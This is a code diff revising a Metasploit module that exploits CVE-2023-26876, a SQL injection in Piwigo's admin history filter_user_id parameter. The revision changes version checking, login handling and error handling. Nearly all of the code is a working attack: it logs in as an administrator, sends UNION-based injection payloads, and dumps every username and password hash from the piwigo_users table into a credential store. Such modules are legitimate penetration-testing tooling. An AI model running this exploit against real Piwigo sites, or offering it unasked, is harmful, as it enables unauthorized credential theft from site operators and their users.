@@ -15,7 +15,9 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'Piwigo CVE-2023-26876 Gather Credentials via SQL Injection ',
         'Description' => %q{
-          This module allows an authenticated user to retrieve the usernames and encrypted passwords of other users in Piwigo through SQL injection using the (filter_user_id) parameter.
+          This module retrieves usernames and password hashes through the history
+          filter_user_id SQL injection in Piwigo 13.2.0 through 13.6.0. It requires
+          an authenticated administrator. Piwigo 13.7.0 fixes this vulnerability.
         },
         'Author' => [
           'rodnt', # metasploit module
@@ -26,6 +28,7 @@ class MetasploitModule < Msf::Auxiliary
         'References' => [
           [ 'CVE', '2023-26876' ],
           ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2023-26876'],
+          ['URL', 'https://piwigo.org/release-13.7.0'],
         ],
         'DisclosureDate' => '2023-04-21',
         'Notes' => {
@@ -46,115 +49,139 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def check
-    login_page = target_uri.path.end_with?('index.php') ? normalize_uri(target_uri.path) : normalize_uri(target_uri.path, '/index.php')
+    product_seen = false
+    # Empty galleries omit the versioned assets on index.php; the ordinary
+    # identification form still exposes them without authenticating.
+    %w[index.php identification.php].each do |page|
+      res = send_request_cgi('method' => 'GET', 'keep_cookies' => true, 'uri' => piwigo_uri(page))
+      return Exploit::CheckCode::Unknown('Piwigo version request did not receive a response') unless res
+      return Exploit::CheckCode::Unknown("Piwigo version request returned HTTP #{res.code}") unless res.code == 200
 
-    res = send_request_cgi(
-      'method' => 'GET',
-      'keep_cookies' => true,
-      'uri' => login_page
-    )
+      html = res.get_html_document
+      generator = html.at_css('meta[name="generator"]')&.[]('content')
+      next unless generator.to_s.start_with?('Piwigo')
 
-    if res && res.code == 200 && res.body.match(%r{themes/default/js/jquery.min.js\?v13.5.0})
-      return Exploit::CheckCode::Appears('The target is running Piwigo with version 13.5.0')
-    else
-      return Exploit::CheckCode::Safe('The target does not appear to be running Piwigo with vulnerable version')
+      product_seen = true
+      version_text = html.css('script[src]').filter_map do |script|
+        script['src'][%r{(?:\A|/)themes/default/js/jquery\.min\.js\?v([^&#]+)(?:[&#]|\z)}, 1]
+      end.first
+      next unless version_text
+
+      begin
+        version = Rex::Version.new(version_text)
+      rescue ArgumentError => e
+        elog('Invalid Piwigo version', error: e)
+        return Exploit::CheckCode::Unknown('Piwigo returned an invalid version')
+      end
+      if version >= Rex::Version.new('13.2.0') && version < Rex::Version.new('13.7.0')
+        return Exploit::CheckCode::Appears("Piwigo #{version} predates the history-filter fix in 13.7.0")
+      end
+
+      return Exploit::CheckCode::Safe("Piwigo #{version} is outside the affected 13.2.0-13.6.x range")
     end
-  rescue ::Rex::ConnectionError
-    return Exploit::CheckCode::Unknown("#{peer} - Connection failed")
+    product_seen ? Exploit::CheckCode::Detected('Piwigo detected without a version') : Exploit::CheckCode::Safe('Target did not identify as Piwigo')
+  rescue Rex::ConnectionError, OpenSSL::SSL::SSLError => e
+    elog('Piwigo version request failed', error: e)
+    Exploit::CheckCode::Unknown('Piwigo version request failed to connect')
   end
 
   def login
-    login_uri = target_uri.path.end_with?('identification.php') ? normalize_uri(target_uri.path) : normalize_uri(target_uri.path, '/identification.php')
-    print_status('Try to log in..')
+    print_status('Logging into Piwigo')
+    # Piwigo requires a session cookie before POST login. Start a fresh session
+    # independently of AutoCheck and any previously authenticated credentials.
+    cookie_jar.clear
+    form = send_request_cgi('method' => 'GET', 'uri' => piwigo_uri('identification.php'), 'keep_cookies' => true)
+    fail_with(Failure::Unreachable, 'Piwigo login form did not receive a response') unless form
+    fail_with(Failure::UnexpectedReply, "Piwigo login form returned HTTP #{form.code}") unless form.code == 200
 
-    login_res = send_request_cgi(
+    res = send_request_cgi(
       'method' => 'POST',
-      'uri' => login_uri,
+      'uri' => piwigo_uri('identification.php'),
       'keep_cookies' => true,
-      'vars_post' => {
-        'username' => datastore['USERNAME'],
-        'password' => datastore['PASSWORD'],
-        'login' => 'Login'
-      }
+      'vars_post' => { 'username' => datastore['USERNAME'], 'password' => datastore['PASSWORD'], 'login' => 'Login' }
     )
-
-    if login_res.code != 302 || login_res.body.include?('Invalid username or password!')
-      fail_with(Failure::NoAccess, "Couldn't log into Piwigo")
-    end
+    fail_with(Failure::Unreachable, 'Piwigo login did not receive a response') unless res
+    fail_with(Failure::NoAccess, 'Piwigo login was rejected') unless res.code == 302
 
     print_good('Successfully logged into Piwigo')
   end
 
-  def test_vulnerable(response)
-    body_response = response.body.to_s
-    if body_response.include?('var filter_user_name = "pwn3d";')
-      print_good('Target is vulnerable')
-      return true
-    else
-      print_error('Target is NOT vulnerable')
-      return false
-    end
-  end
-
   def dump_data(sqli)
-    creds_table = Rex::Text::Table.new(
-      'Header' => 'Piwigo Users',
-      'Indent' => 1,
-      'Columns' => ['username', 'hash']
-    )
-    results = sqli.run_sql('select group_concat(cast(concat_ws(0x3b,ifnull(username,repeat(0x31,0)),ifnull(password,repeat(0xd,0))) as binary)) from piwigo_users')
-
-    body_results = results.body.to_s
-    match = body_results.match(/var filter_user_name = "(.*?)";/)
-    if match
-      data = match[1]
-      data.split(',').each do |user_and_pw|
-        user, hash = user_and_pw.split(';', 2)
-
-        creds_table << [user, hash]
-        create_credential({
-          workspace_id: myworkspace_id,
-          origin_type: :service,
-          module_fullname: fullname,
-          username: user,
-          private_type: :nonreplayable_hash,
-          jtr_format: Metasploit::Framework::Hashes.identify_hash(hash),
-          private_data: user,
-          service_name: 'piwigo',
-          address: datastore['RHOST'],
-          port: datastore['RPORT'],
-          protocol: 'tcp',
-          status: Metasploit::Model::Login::Status::UNTRIED
-        })
+    rows = sqli.dump_table_fields('piwigo_users', %w[username password])
+    table = Rex::Text::Table.new('Header' => 'Piwigo Users', 'Indent' => 1, 'Columns' => ['username', 'hash'])
+    rows.each do |row|
+      unless row.is_a?(Array) && (1..2).cover?(row.length) && row.all? { |field| field.is_a?(String) }
+        fail_with(Failure::UnexpectedReply, 'Piwigo user extraction returned a malformed row')
       end
-      rows_data = creds_table.rows.length
-      if rows_data > 1
-        print_status("Dump of usernames and hashes:\n")
-        print_line creds_table.to_s
-      end
+      user = piwigo_text(row[0])
+      # Common maps NULL to an empty string and may omit a trailing empty field.
+      hash = piwigo_text(row[1] || '')
+      table << [user, hash]
+      next if hash.empty?
+
+      create_credential(
+        workspace_id: myworkspace_id,
+        origin_type: :service,
+        module_fullname: fullname,
+        username: user,
+        private_type: :nonreplayable_hash,
+        jtr_format: Metasploit::Framework::Hashes.identify_hash(hash),
+        private_data: hash,
+        service_name: 'piwigo',
+        address: rhost,
+        port: rport,
+        protocol: 'tcp',
+        status: Metasploit::Model::Login::Status::UNTRIED
+      )
     end
+    print_status('Dump of usernames and hashes:')
+    print_line(table.to_s)
   end
 
   def get_info
-    sqli = create_sqli(dbms: MySQLi::Common, opts: { hex_encode_strings: true }) do |payload|
-      send_request_cgi({
+    probing = true
+    sqli = create_sqli(dbms: MySQLi::Common, opts: { hex_encode_strings: true, encoder: :hex, safe: true }) do |payload|
+      res = send_request_cgi(
         'method' => 'GET',
-        'uri' => normalize_uri(target_uri.path, 'admin.php'),
-        'vars_get' => {
-          'page' => 'history',
-          'filter_image_id' => '1',
-          'filter_user_id' => "123123123 union all #{payload}"
-        }
-      })
-    end
+        'uri' => piwigo_uri('admin.php'),
+        'vars_get' => { 'page' => 'history', 'filter_image_id' => '1', 'filter_user_id' => "123123123 union all #{payload}" }
+      )
+      fail_with(Failure::Unreachable, 'Piwigo history request did not receive a response') unless res
+      fail_with(Failure::NoAccess, 'Piwigo history requires an authenticated administrator') if [301, 302, 401, 403].include?(res.code)
+      fail_with(Failure::UnexpectedReply, "Piwigo history returned HTTP #{res.code}") unless res.code == 200
 
-    if test_vulnerable(sqli.run_sql('select 0x70776e3364'))
-      dump_data(sqli)
+      scalar = res.body.to_s[/^\s*var\s+filter_user_name\s*=\s*"([^"]*)";/, 1]
+      if !probing && (scalar.nil? || scalar.empty? || !scalar.match?(/\A[0-9a-f;]+\z/i))
+        fail_with(Failure::UnexpectedReply, 'Piwigo history did not return the expected encoded result')
+      end
+      scalar
     end
+    fail_with(Failure::NotVulnerable, 'Piwigo history did not return the SQL injection probe') unless sqli.test_vulnerable
+
+    print_good('Target is vulnerable')
+    probing = false
+    dump_data(sqli)
   end
 
   def run
     login
     get_info
+  rescue Rex::ConnectionError, OpenSSL::SSL::SSLError => e
+    elog('Piwigo credential collection failed to connect', error: e)
+    fail_with(Failure::Unreachable, 'Piwigo credential collection failed to connect')
+  end
+
+  private
+
+  def piwigo_uri(page)
+    base = target_uri.path.sub(/(?:index|identification)\.php\z/, '')
+    normalize_uri(base, page)
+  end
+
+  def piwigo_text(value)
+    text = value.dup.force_encoding(::Encoding::UTF_8)
+    fail_with(Failure::UnexpectedReply, 'Piwigo returned text that is not valid UTF-8') unless text.valid_encoding?
+
+    text
   end
 end
